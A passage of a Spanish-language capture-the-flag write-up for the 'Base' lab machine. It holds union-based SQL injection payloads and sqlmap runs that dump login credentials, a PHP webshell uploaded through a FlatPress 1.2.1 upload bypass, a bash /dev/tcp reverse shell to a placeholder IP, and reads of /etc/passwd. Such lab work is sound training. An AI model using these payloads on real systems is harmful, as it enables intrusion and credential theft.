+<li><code>database()</code>: El nombre de la base de datos actual.</li>
+<li><code>version()</code>: La versión de MySQL usada.</li>
+<li><code>user()</code>: El usuario con el que se conecta la aplicación.</li>
+<li><code>@@datadir</code>: La ruta del directorio de datos.</li>
+<li><code>current_user()</code>: El usuario actual que está ejecutando la BD.</li>
+</ul>
+<p>Ya con este resultado comprobamos que es vulnerable a <strong>Inyecciones SQL Basadas en Uniones</strong>.</p>
+<p>Obtengamos las bases de datos existentes con la siguiente inyección:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&#39;</span> union <span style="color:#66d9ef">select</span> schema_name,2,3,4,5 from information_schema.schemata-- -
+</span></span></code></pre></div><p>Observa el resultado:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-base/Captura10.png">
+</p>
+<p>Muy bien, ahí podemos ver la BD del <strong>CMS FlatPress</strong>.</p>
+<p>Obtengamos sus tablas con la siguiente inyección:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#e6db74">&#39; union select table_name,2,3,4,5 from information_schema.tables where table_schem=&#39;</span>FlatPress<span style="color:#960050;background-color:#1e0010">&#39;</span>-- -
+</span></span></code></pre></div><p>Observa el resultado:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-base/Captura11.png">
+</p>
+<p>Vemos la tabla login.</p>
+<p>Obtengamos las columnas de esa tabla con la siguiente inyección:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#e6db74">&#39; union select column_name,2,3,4,5 from information_schema.columns where table_schem=&#39;</span>FlatPress<span style="color:#e6db74">&#39; and table_name=&#39;</span>login<span style="color:#960050;background-color:#1e0010">&#39;</span>-- -
+</span></span></code></pre></div><p>Observa el resultado:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-base/Captura12.png">
+</p>
+<p>Solo hay 3 columnas.</p>
+<p>Obtengamos los datos de esas columnas con la siguiente inyección:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&#39;</span> union <span style="color:#66d9ef">select</span> id,user,password,NULL,NULL from FlatPress.login-- -
+</span></span></code></pre></div><p>Observa el resultado:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-base/Captura13.png">
+</p>
+<p>Excelente, ya tenemos credenciales válidas para el <strong>CMS FlatPress</strong>.</p>
+<p>Entra en el <strong>Login</strong> y mete las credenciales que obtuvimos:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-base/Captura14.png">
+</p>
+<p>Estamos dentro.</p>
+<h3 id="SQLMAP">Automatizando Inyecciones SQL con SQLMAP</h3>
+<p>Comprobemos con <strong>SQLMAP</strong> si la página web del <strong>puerto 8080</strong> es vulnerable a <strong>Inyecciones SQL</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#39;http://192.168.100.70:8080/&#39;</span> --batch --forms
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>sqlmap resumed the following injection point<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> from stored session:
+</span></span><span style="display:flex;"><span>---
+</span></span><span style="display:flex;"><span>Parameter: query <span style="color:#f92672">(</span>GET<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    Type: time-based blind
+</span></span><span style="display:flex;"><span>    Title: MySQL &gt;<span style="color:#f92672">=</span> 5.0.12 AND time-based blind <span style="color:#f92672">(</span>query SLEEP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    Payload: query<span style="color:#f92672">=</span>Ecyj<span style="color:#e6db74">&#39; AND (SELECT 4462 FROM (SELECT(SLEEP(5)))NgVh) AND &#39;</span>zbXD<span style="color:#e6db74">&#39;=&#39;</span>zbXD
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Type: UNION query
+</span></span><span style="display:flex;"><span>    Title: Generic UNION query <span style="color:#f92672">(</span>NULL<span style="color:#f92672">)</span> - <span style="color:#ae81ff">5</span> columns
+</span></span><span style="display:flex;"><span>    Payload: query<span style="color:#f92672">=</span>Ecyj<span style="color:#960050;background-color:#1e0010">&#39;</span> UNION ALL SELECT NULL,NULL,CONCAT<span style="color:#f92672">(</span>0x716b6a7071,0x4977646d4665774a4249684e4d737851494f436b6b756543614855784e6e6757536c70694773596f,0x71707a7071<span style="color:#f92672">)</span>,NULL,NULL-- -
+</span></span><span style="display:flex;"><span>---
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">do</span> you want to exploit this SQL injection? <span style="color:#f92672">[</span>Y/n<span style="color:#f92672">]</span> Y
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>13:21:59<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> the back-end DBMS is MySQL
+</span></span><span style="display:flex;"><span>web server operating system: Linux Debian
+</span></span><span style="display:flex;"><span>web application technology: Apache 2.4.62
+</span></span><span style="display:flex;"><span>back-end DBMS: MySQL &gt;<span style="color:#f92672">=</span> 5.0.12 <span style="color:#f92672">(</span>MariaDB fork<span style="color:#f92672">)</span>
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-u</em></td>
+					<td>Define la URL objetivo.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;batch</em></td>
+					<td>Ejecuta el comando sin solicitar confirmaciones al usuario.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;forms</em></td>
+					<td>Analiza y prueba formularios en la URL objetivo.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Sí es vulnerable.</p>
+<p>Obtengamos las bases de datos existentes:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#39;http://192.168.100.70:8080/&#39;</span> --batch --forms --dbs
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>13:22:10<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> fetching database names
+</span></span><span style="display:flex;"><span>available databases <span style="color:#f92672">[</span>6<span style="color:#f92672">]</span>:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> FlatPress
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> information_schema
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> mysql
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Nombres
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> performance_schema
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> sys
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-u</em></td>
+					<td>Define la URL objetivo.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;batch</em></td>
+					<td>Ejecuta el comando sin solicitar confirmaciones al usuario.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;forms</em></td>
+					<td>Analiza y prueba formularios en la URL objetivo.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;dbs</em></td>
+					<td>Enumera todas las bases de datos disponibles.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Bien, tenemos todas las bases de datos.</p>
+<p>Obtengamos las tablas de la BD de <strong>FlatPress</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#39;http://192.168.100.70:8080/&#39;</span> --batch --forms -D <span style="color:#e6db74">&#39;FlatPress&#39;</span> --tables
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>13:22:56<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> fetching tables <span style="color:#66d9ef">for</span> database: <span style="color:#e6db74">&#39;FlatPress&#39;</span>
+</span></span><span style="display:flex;"><span>Database: FlatPress
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#ae81ff">1</span> table<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>+-------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| login |
+</span></span><span style="display:flex;"><span>+-------+
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-u</em></td>
+					<td>Define la URL objetivo.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;batch</em></td>
+					<td>Ejecuta el comando sin solicitar confirmaciones al usuario.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;forms</em></td>
+					<td>Analiza y prueba formularios en la URL objetivo.</td>
+			</tr>
+			<tr>
+					<td><em>-D</em></td>
+					<td>Selecciona una base de datos especifica a enumerar.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;tables</em></td>
+					<td>Enumera las tablas de una base de datos específica.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Como ya conocemos las columnas que tiene esa tabla, simplemente dumpeemos los datos que tiene:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#39;http://192.168.100.70:8080/&#39;</span> --batch --forms -D <span style="color:#e6db74">&#39;FlatPress&#39;</span> -T <span style="color:#e6db74">&#39;login&#39;</span> --dump
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>13:23:09<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> fetching entries <span style="color:#66d9ef">for</span> table <span style="color:#e6db74">&#39;login&#39;</span> in database <span style="color:#e6db74">&#39;FlatPress&#39;</span>
+</span></span><span style="display:flex;"><span>Database: FlatPress
+</span></span><span style="display:flex;"><span>Table: login
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#ae81ff">1</span> entry<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>+----+--------+-----------------------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| id | user   | password              |
+</span></span><span style="display:flex;"><span>+----+--------+-----------------------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| <span style="color:#ae81ff">1</span>  | r0dgar | SNIETbkGBCnhFqeUJuqBO |
+</span></span><span style="display:flex;"><span>+----+--------+-----------------------+
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-u</em></td>
+					<td>Define la URL objetivo.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;batch</em></td>
+					<td>Ejecuta el comando sin solicitar confirmaciones al usuario.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;forms</em></td>
+					<td>Analiza y prueba formularios en la URL objetivo.</td>
+			</tr>
+			<tr>
+					<td><em>-D</em></td>
+					<td>Selecciona una base de datos específica a enumerar.</td>
+			</tr>
+			<tr>
+					<td><em>-T</em></td>
+					<td>Selecciona una tabla específica a enumerar.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;dump</em></td>
+					<td>Extraer datos de una tabla específica.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Y volvimos a obtener las credenciales de acceso.</p>
+<p>Continuemos.</p>
+<h3 id="FlatPressBypass">Aplicando Bypass a Carga de Archivos de FlatPress Ver. 1.2.1 (File Upload Bypass + RCE)</h3>
+<p>Recordando que el <strong>FlatPress</strong> es la <strong>versión 1.2.1</strong>, podemos buscarle un Exploit.</p>
+<p>Encontré el siguiente:</p>
+<ul>
+<li><a href="https://github.com/flatpressblog/flatpress/issues/152" target="_blank">Flatpress 1.2.1 - File upload bypass to RCE Vulnerebility</a></li>
+</ul>
+<p>En este ticket de <strong>GitHub</strong> hacia el repositorio de <strong>FlatPress</strong>, explica cómo es que podemos aplicar un Bypass a la carga de archivos, pues siempre evita que podamos subir <strong>archivos PHP</strong>, lo que nos impide cargar una <strong>WebShell</strong> o <strong>Reverse Shell</strong>.</p>
+<p>Vamos a aplicarlo.</p>
+<p>Crea la siguiente <strong>WebShell</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>GIF89a;
+</span></span><span style="display:flex;"><span>&lt;?php
+</span></span><span style="display:flex;"><span>system<span style="color:#f92672">(</span>$_GET<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;cmd&#39;</span><span style="color:#f92672">])</span>;
+</span></span><span style="display:flex;"><span>?&gt;
+</span></span></code></pre></div><p>Cárgala al <strong>FlatPress</strong> en la sección <strong>Uploader</strong>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-base/Captura15.png">
+</p>
+<p>Dale al botón <strong>Upload</strong> y debería dejarte subir la <strong>WebShell</strong>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-base/Captura16.png">
+</p>
+<p>Funcionó.</p>
+<p>Ahí mismo, pasa a la subsección <strong>Media manager</strong> para ver nuestra <strong>WebShell</strong> cargada:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-base/Captura17.png">
+</p>
+<p>Selecciona la <strong>WebShell</strong> y escribe el siguiente parámetro en la URL <code>?cmd=id</code>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-base/Captura18.png">
+</p>
+<p>Funciona, podemos ejecutar comandos, por lo que podemos mandar una <strong>Reverse Shell</strong>.</p>
+<p>Abre un listener con <strong>netcat</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span></code></pre></div><p>Ejecuta la siguiente <strong>Reverse Shell</strong> en la URL:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash -c <span style="color:#e6db74">&#39;bash -i &gt;%26 /dev/tcp/Tu_IP/443 0&gt;%261&#39;</span>
+</span></span></code></pre></div><p align="center">
+<img src="/assets/images/THL-writeup-base/Captura19.png">
+</p>
+<p>Observa la <strong>netcat</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>Tu_IP<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>192.168.100.70<span style="color:#f92672">]</span> <span style="color:#ae81ff">38114</span>
+</span></span><span style="display:flex;"><span>bash: cannot set terminal process group <span style="color:#f92672">(</span>698<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
+</span></span><span style="display:flex;"><span>bash: no job control in this shell
+</span></span><span style="display:flex;"><span>www-data@TheHackersLabs-Base:/var/www/html/fp-content/attachs$ whoami
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>www-data
+</span></span></code></pre></div><p>Estamos dentro.</p>
+<p>Solo falta obtener una sesión interactiva:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Paso 1:</span>
+</span></span><span style="display:flex;"><span>script /dev/null -c bash
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Paso 2:</span>
+</span></span><span style="display:flex;"><span>CTRL + Z
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Paso 3:</span>
+</span></span><span style="display:flex;"><span>stty raw -echo; fg
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Paso 4:</span>
+</span></span><span style="display:flex;"><span>reset -&gt; xterm
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Paso 5:</span>
+</span></span><span style="display:flex;"><span>export TERM<span style="color:#f92672">=</span>xterm <span style="color:#f92672">&amp;&amp;</span> export SHELL<span style="color:#f92672">=</span>bash <span style="color:#f92672">&amp;&amp;</span> stty rows <span style="color:#ae81ff">51</span> columns <span style="color:#ae81ff">189</span>
+</span></span></code></pre></div><p>Como nota adicional, si intentas hacer este mismo proceso para ganar acceso a la máquina víctima con una <strong>Reverse Shell</strong>, no funcionará, aunque no encontré el motivo de esto.</p>
+<h2 id="Post">Post Explotación</h2>
+<h3 id="linEnum">Enumeración de la Máquina Víctima, Crackeo de Hash Encontrado y Ganando Acceso a Máquina Vía SSH</h3>
+<p>Si nos vamos a la ruta <code>/var/www/sitio2</code>, encontraremos el archivo vulnerable a <strong>SQLi</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@TheHackersLabs-Base:/var/www/sitio2$ ls  
+</span></span><span style="display:flex;"><span>16.jpg	index.php  search.php
+</span></span><span style="display:flex;"><span>www-data@TheHackersLabs-Base:/var/www/sitio2$ cat search.php 
+</span></span><span style="display:flex;"><span>&lt;?php
+</span></span><span style="display:flex;"><span>// Configuración de la base de datos
+</span></span><span style="display:flex;"><span>$servername <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;localhost&#34;</span>;
+</span></span><span style="display:flex;"><span>$username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;base&#34;</span>; // Usuario de la base de datos
+</span></span><span style="display:flex;"><span>$password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;rodgar&#34;</span>; // Contraseña del usuario de la base de datos
+</span></span><span style="display:flex;"><span>$dbname <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Nombres&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>// Crear conexión
+</span></span><span style="display:flex;"><span>$conn <span style="color:#f92672">=</span> new mysqli<span style="color:#f92672">(</span>$servername, $username, $password, $dbname<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>// Verificar la conexión
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>$conn-&gt;connect_error<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    die<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Conexión fallida: &#34;</span> . $conn-&gt;connect_error<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>// Obtener la consulta del formulario
+</span></span><span style="display:flex;"><span>$query <span style="color:#f92672">=</span> isset<span style="color:#f92672">(</span>$_GET<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;query&#39;</span><span style="color:#f92672">])</span> ? $_GET<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;query&#39;</span><span style="color:#f92672">]</span> : <span style="color:#e6db74">&#39;&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>// Consulta SQL <span style="color:#f92672">(</span>vulnerable a SQL Injection<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>$sql <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;SELECT * FROM name WHERE nombre LIKE &#39;%</span>$query<span style="color:#e6db74">%&#39;&#34;</span>;
+</span></span><span style="display:flex;"><span>$result <span style="color:#f92672">=</span> $conn-&gt;query<span style="color:#f92672">(</span>$sql<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>// Mostrar resultados
+</span></span><span style="display:flex;"><span>?&gt;
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Aquí vemos varias cosas:</p>
+<ul>
+<li>El servidor, usuario, contraseña y base de datos a los que se conecta el script.</li>
+<li>El parámetro que obtiene la consulta del formulario.</li>
+<li>La consulta SQL vulnerable a <strong>SQLi</strong>, pues la consulta no está aplicando ninguna sanitización ni filtro.</li>
+</ul>
+<p>Veamos qué usuarios existen en la máquina:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@TheHackersLabs-Base:/var/www/sitio2$ cat /etc/passwd | grep bash
+</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
+</span></span><span style="display:flex;"><span>pedro:x:1001:1001::/home/pedro:/bin/bash
+</span></span><span style="display:flex;"><span>flate:x:1002:1002::/home/flate:/bin/bash
+</span></span></code></pre></div><p>Hay 2 usuarios aparte del <strong>Root</strong>.</p>
+<p>Si nos vamos al directorio <code>/home</code>, veremos los directorios de dichos usuarios:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@TheHackersLabs-Base:/var/www/sitio2$ cd /home
+</span></span><span style="display:flex;"><span>www-data@TheHackersLabs-Base:/home$ ls -la
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">16</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">4</span> root  root  <span style="color:#ae81ff">4096</span> Sep <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">2024</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">19</span> root  root  <span style="color:#ae81ff">4096</span> Sep <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">2024</span> ..
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">3</span> flate flate <span style="color:#ae81ff">4096</span> Sep <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">2024</span> flate
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">3</span> pedro pedro <span style="color:#ae81ff">4096</span> Sep <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">2024</span> pedro
+</span></span></code></pre></div><p>Tenemos acceso a ambos.</p>
+<p>Si entramos en el directorio del <strong>usuario flate</strong>, encontraremos la flag del usuario:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@TheHackersLabs-Base:/home$ cd flate/
+</span></span><span style="display:flex;"><span>www-data@TheHackersLabs-Base:/home/flate$ ls -la
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">36</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">3</span> flate flate <span style="color:#ae81ff">4096</span> Sep <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">2024</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">4</span> root  root  <span style="color:#ae81ff">4096</span> Sep <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">2024</span> ..
+</span></span><span style="display:flex;"><span>-rw------- <span style="color:#ae81ff">1</span> flate flate    <span style="color:#ae81ff">0</span> Sep <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">2024</span> .bash_history
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> flate flate  <span style="color:#ae81ff">220</span> Mar <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2024</span> .bash_logout
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> flate flate <span style="color:#ae81ff">3526</span> Mar <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2024</span> .bashrc
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> flate flate <span style="color:#ae81ff">5290</span> Jul <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">2023</span> .face
+</span></span><span style="display:flex;"><span>lrwxrwxrwx <span style="color:#ae81ff">1</span> flate flate    <span style="color:#ae81ff">5</span> Jul <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">2023</span> .face.icon -&gt; .face
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">3</span> flate flate <span style="color:#ae81ff">4096</span> Sep <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">2024</span> .local
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> flate flate  <span style="color:#ae81ff">807</span> Mar <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2024</span> .profile
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> flate flate   <span style="color:#ae81ff">33</span> Sep <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">2024</span> user.txt
+</span></span><span style="display:flex;"><span>www-data@TheHackersLabs-Base:/home/flate$ cat user.txt
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Si nos movemos al directorio del <strong>usuario pedro</strong> y listamos sus archivos, no encontraremos algo útil:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@TheHackersLabs-Base:/home/flate$ cd ../pedro
+</span></span><span style="display:flex;"><span>www-data@TheHackersLabs-Base:/home/pedro$ ls -la
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">20</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">3</span> pedro pedro <span style="color:#ae81ff">4096</span> Sep <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">2024</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">4</span> root  root  <span style="color:#ae81ff">4096</span> Sep <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">2024</span> ..
+</span></span><span style="display:flex;"><span>lrwxrwxrwx <span style="color:#ae81ff">1</span> pedro pedro    <span style="color:#ae81ff">9</span> Sep <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">2024</span> .bash_history -&gt; /dev/null
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> pedro pedro <span style="color:#ae81ff">5290</span> Jul <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">2023</span> .face
+</span></span><span style="display:flex;"><span>lrwxrwxrwx <span style="color:#ae81ff">1</span> pedro pedro    <span style="color:#ae81ff">5</span> Jul <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">2023</span> .face.icon -&gt; .face
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">3</span> pedro pedro <span style="color:#ae81ff">4096</span> Sep <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">2024</span> .local
